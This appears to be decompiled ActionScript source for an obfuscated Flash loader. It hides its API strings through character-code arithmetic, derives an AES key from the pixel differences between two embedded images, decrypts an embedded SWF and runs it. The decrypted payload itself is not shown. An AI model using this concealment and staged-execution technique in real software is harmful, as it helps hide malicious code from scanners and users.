package {
    import flash.events.*;
    import flash.utils.*;
    import com.hurlant.crypto.symmetric.*;
    import com.hurlant.crypto.hash.*;
    import flash.display.*;
    import flash.text.*;
    import com.hurlant.crypto.*;
    import com.hurlant.util.*;
    import flash.system.*;

    public class __A extends Sprite {

        private static const SRM:int = 1;
        private static const SRI1:int = 2;
        private static const SRI2:int = 3;
        private static const SD:int = 4;

        private var _a:ByteArray = null;
        private var _b:ByteArray = null;
        private var _c:Bitmap = null;
        private var _d:Bitmap = null;
        private var _e:BitmapData = null;
        private var _f:int;
        private var _g:int;
        private var _i:Loader;
        private var _j:int = -1;
        public var cnt;
        private var __U:Function;
        private var __R:String;
        private var __S:String;
        private var __T:String;
        private var __W:String;
        private var __X:String;
        private var __Y:String;
        private var __Z:String;
        private var __V:String = "-3-2-101234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        private var tf:TextField = null;

        public function __A(){
            this.__U = String.fromCharCode;
            this.__R = (((((((this.__U(((6 * 20) - ((SRI1 * SRI1) * SRI1))) + this.__U(((55 * SRI1) + 1))) + this.__U(((10 * 11) + (10 / SRI1)))) + this.__U((21 * 5))) + this.__U(((6 * 19) + SRI1))) + this.__U((111 - (SRI1 * 3)))) + this.__U(((1 + 10) + (10 * 10)))) + this.__U((144 - 34)));
            this.__S = (((((((((this.__U(((110 + 10) - 3)) + this.__U((22 * 5))) + this.__U(((11 * 3) * 3))) + this.__U(((10 * 11) + 1))) + this.__U(((10 * 11) - 1))) + this.__U(((22 * 5) + SRI1))) + this.__U(((12 * 12) - 30))) + this.__U((1 + (10 * 10)))) + this.__U((120 - 5))) + this.__U((23 * 5)));
            this.__T = (((((((((this.__U(((6 * 20) - 1)) + this.__U(((7 * 17) - 5))) + this.__U((21 * 5))) + this.__U((100 + (((SRI1 * SRI1) * SRI1) * SRI1)))) + this.__U(((10 * 10) + 1))) + this.__U(((5 + 6) * 6))) + this.__U(((6 * 20) + 1))) + this.__U((100 + (((SRI1 * SRI1) * SRI1) * SRI1)))) + this.__U(((5 * 20) + 1))) + this.__U(((10 * 11) + 5)));
            this.__W = (((((this.__U(((12 * 12) - 40)) + this.__U((303 / 3))) + this.__U(((13 * -3) + (12 * 12)))) + this.__U(((51 * SRI1) + 1))) + this.__U((52 * SRI1))) + this.__U(((5 * 20) + (SRI1 * 8))));
            this.__X = ((((this.__U(((11 * 11) - SRI1)) + this.__U(((13 * -3) + (12 * 12)))) + this.__U(((303 / 3) - 1))) + this.__U(((5 * 20) + (SRI1 * 8)))) + this.__U(((12 * 12) - 40)));
            this.__Y = (((((this.__U((SRI1 * 54)) + this.__U((303 / 3))) + this.__U((105 + 5))) + this.__U(((51 * SRI1) + 1))) + this.__U(((5 * 20) + (SRI1 * 8)))) + this.__U(((12 * 12) - 40)));
            this.__Z = ((this.__U(((16 * 6) + 1)) + this.__U((303 / 3))) + this.__U((((5 * 20) + (SRI1 * 8)) - 1)));
            super();
            var _local1 = 3;
            if (this.stage == null){
                this.addEventListener(Event.ADDED_TO_STAGE, this.handleAddedToStage);
            } else {
                this.stage.scaleMode = StageScaleMode.NO_SCALE;
                this.stage.align = StageAlign.TOP_LEFT;
                this._gq();
            };
            this.tabEnabled = false;
            this.focusRect = null;
        }
        private function handleAddedToStage(_arg1:Event):void{
            this.removeEventListener(Event.ADDED_TO_STAGE, this.handleAddedToStage);
            this._gq();
        }
        private function _gq():void{
            this.tf = new TextField();
            this.tf.autoSize = "left";
            this.tf.text = "Loading";
            this.tf.x = ((this.stage.stageWidth - this.tf.width) / 2);
            this.tf.y = ((this.stage.stageHeight - this.tf.height) / 2);
            this.addChild(this.tf);
            this._j = (SRM - 1);
            this._h();
        }
        private function _h():void{
            this._j++;
            switch (this._j){
                case SRI1:
                    this.tf.appendText(".");
                    this.r_2();
                    break;
                case SRM:
                    this.tf.appendText(".");
                    this.r_1();
                    break;
                case SRI2:
                    this.tf.appendText(".");
                    this.r_ib();
                    break;
                case SD:
                    this.tf.appendText(".");
                    this.__AS2();
                    break;
            };
        }
        private function r_1():void{
            var _A_:* = __A__A_;
            this._a = (new (_A_)() as ByteArray);
            try {
                var _local2 = this._a;
                _local2[this.__S]();
            } catch(_B:Error) {
            };
            this._h();
        }
        private function r_2():void{
            var _local1:Class = __A__C;
            this._c = (new (_local1)() as Bitmap);
            this._f = this._c[this.__X];
            this._g = this._c[this.__W];
            this._h();
        }
        private function r_ib():void{
            var _local1:uint = this._a.readUnsignedInt();
            this._b = new ByteArray();
            var _local3 = this._b;
            _local3[this.__T](this._a, this._a[this.__R], _local1);
            this._a[this.__R] = (this._a[this.__R] + _local1);
            var _local2:Loader = new Loader();
            _local2.contentLoaderInfo.addEventListener(Event.COMPLETE, this.__AS1);
            _local2.loadBytes(this._b, new LoaderContext(false, ApplicationDomain.currentDomain, null));
        }
        private function __AS1(_arg1:Event):void{
            this._d = (LoaderInfo(_arg1.target).content as Bitmap);
            this._h();
        }
        private function __AS2():void{
            var _local12:int;
            var _local13:int;
            var _local14:int;
            var _local15:int;
            var _local1:ByteArray = new ByteArray();
            var _local16 = _local1;
            _local16[this.__T](this._a, this._a[this.__R], (this._a[this.__Y] - this._a[this.__R]));
            var _local2:int = this._d[this.__X];
            var _local3:int = this._d[this.__W];
            var _local4 = "";
            var _local5:int;
            while (_local5 < _local2) {
                _local12 = 0;
                while (_local12 < _local3) {
                    _local13 = this._c.bitmapData.getPixel(_local5, _local12);
                    _local14 = this._d.bitmapData.getPixel(_local5, _local12);
                    _local15 = ((_local13 & 0xFF) - (_local14 & 0xFF));
                    _local4 = (_local4 + (_local15 - 1).toString());
                    _local12++;
                };
                _local5++;
            };
            var _local6:MD5 = new MD5();
            var _local7:ByteArray = _local6.hash(Hex.toArray(Hex.fromString(_local4)));
            var _local8:uint = ((((((((((2 * 2) * 2) * 2) * 2) * 2) * 2) * 2) * 2) * 2) * 2);
            var _local9:ByteArray = new ByteArray();
            _local16 = _local9;
            _local16[this.__T](_local1, 0, _local8);
            this._k(_local9, _local7, null);
            var _local10:ByteArray = new ByteArray();
            _local16 = _local10;
            _local16[this.__T](_local1, (_local1[this.__Y] - _local8), _local8);
            this._k(_local10, _local7, null);
            var _local11:ByteArray = new ByteArray();
            _local16 = _local11;
            _local16[this.__T](_local9, 0, _local8);
            _local16 = _local11;
            _local16[this.__T](_local1, _local8, (_local1[this.__Y] - (SRI1 * _local8)));
            _local16 = _local11;
            _local16[this.__T](_local10, 0, _local8);
            this._l(_local11);
        }
        private function _k(_arg1:ByteArray, _arg2:ByteArray, _arg3:ByteArray):void{
            var _local8:IVMode;
            var _local4:String = Hex.fromArray(_arg2);
            var _local5:ByteArray = new ByteArray();
            _local5.writeMultiByte(_local4.substr(0, ((SRI1 + 13) + 1)), this.__V.substr(6, ((((SRI1 * 4) / SRI1) * SRI1) * SRI1)));
            var _local6:IPad = new NullPad();
            var _local7:ICipher = Crypto.getCipher(this.__Z, _local5, _local6);
            _local6.setBlockSize(_local7.getBlockSize());
            if ((_local7 is IVMode)){
                _local8 = (_local7 as IVMode);
                _local8.IV = _local5;
            };
            _local7.decrypt(_arg1);
            _arg1[this.__R] = 0;
        }
        private function _l(_arg1:ByteArray):void{
            this._i = new Loader();
            this._i.contentLoaderInfo.addEventListener(Event.COMPLETE, this.swfLoaded);
            this._i.contentLoaderInfo.addEventListener(ProgressEvent.PROGRESS, this.handleProgress);
            this._i.loadBytes(_arg1);
        }
        private function handleProgress(_arg1:ProgressEvent):void{
            this.tf.text = (("Loading " + Math.round(((_arg1.bytesLoaded / _arg1.bytesTotal) * 100))) + "%");
        }
        private function swfLoaded(_arg1:Event):void{
            var __A:* = _arg1;
            __A.target.removeEventListener(Event.COMPLETE, this.swfLoaded);
            __A.target.removeEventListener(ProgressEvent.PROGRESS, this.handleProgress);
            this.removeChild(this.tf);
            this.tf = null;
            this.cnt = __A.target.content;
            try {
                Object(this.cnt).isStageRoot = true;
            } catch(err:Error) {
            };
            this.stage.addChild(__A.target.content);
            try {
                Object(this.cnt).initialize();
            } catch(err:Error) {
            };
        }

    }
}//package 
